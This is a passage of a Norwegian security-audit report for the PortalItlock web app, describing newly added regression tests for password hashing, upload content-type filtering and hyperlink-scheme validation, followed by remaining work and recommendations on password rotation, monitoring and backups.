Lagt til `src/PortalItlock.Web.Tests` (xUnit), koblet inn i `PortalItlock.sln`, med `ProjectReference` til hovedprosjektet. `[assembly: InternalsVisibleTo("PortalItlock.Web.Tests")]` lagt til i `Program.cs` slik at interne sikkerhetshjelpere kan testes direkte uten å gjøres `public`.

39 regresjonstester, alle grønne (`dotnet test`):
- **`PasswordHasherTests.cs`**: hash-unikhet (tilfeldig salt), riktig/feil passord, korrupt lagret format gir `false` i stedet for unntak, og at den nye `DummyHash`-mekanismen (funn 9, tidsbasert sidekanal) aldri matcher et ekte passord.
- **`FilSikkerhetTests.cs`**: alle kjente trygge typer slippes gjennom uendret, kjente farlige typer (`text/html`, `application/javascript`, `image/svg+xml` m.fl.) nedgraderes til `application/octet-stream`, case-insensitivitet, og at `; charset=...`-parametre ikke lurer filteret. Dette er direkte regresjonstest av **funn 1 (Kritisk)**.
- **`ForsideRendererTests.cs`**: lenke-skjema-filteret (funn 12) - `http(s)`/`mailto` tillates, `javascript:`/`data:`/`vbscript:`/`file:` avvises. Krevde en liten, ufarlig refaktorering (trakk den innebygde sjekken ut til en egen `internal static ErTryggHyperlenke(...)`-metode i `ForsideRenderer.cs`, samme logikk som før, bare navngitt og testbar isolert).

**Bevisst utelatt** (ville krevd en langt tyngre `WebApplicationFactory`-basert integrasjonstest-rigg med mocket e-post/leietaker-infrastruktur, uforholdsmessig stort i seg selv sammenlignet med fiksene): rate limiting-partisjonering (funn 2-3), `[Authorize]`-håndheving på koblingsskjema (funn 4), og kontoenumerering-responsen (funn 6/14) - disse er i stedet verifisert manuelt live mot den kjørende appen (se "Testet"-linjene under hvert funn over).

## Gjenstår

- **Opplastingsside-validering** (defense-in-depth for funn 1): ikke gjort, se notat under funn 1.

## Anbefalinger jeg ikke kan fikse i kode

- **Roter passordet** som lå i git-historikken i appsettings.json i august 2026 (funn 8), overalt det kan være gjenbrukt.
- **Nøkkelrotasjon generelt**: ingen aktive hemmeligheter ble funnet lekket i gjeldende kode - kun det historiske passordet over. Ingen API-nøkler (Anthropic/Resend/Tripletex) trenger rotering basert på denne gjennomgangen.
- **Overvåking**: vurder å sette opp varsling på Railway for gjentatte 429/krasj-mønstre, slik at et fremtidig rate-limit-forsøk eller en krasjet migrasjon (som 2026-10-08-hendelsen) oppdages raskere enn "nettsiden er nede".
- **Backup**: bekreft at GitHub-backup-rutinen (nevnt i `DatabaseBackupService.cs`) faktisk kjører og at en gjenoppretting er testet minst én gang.
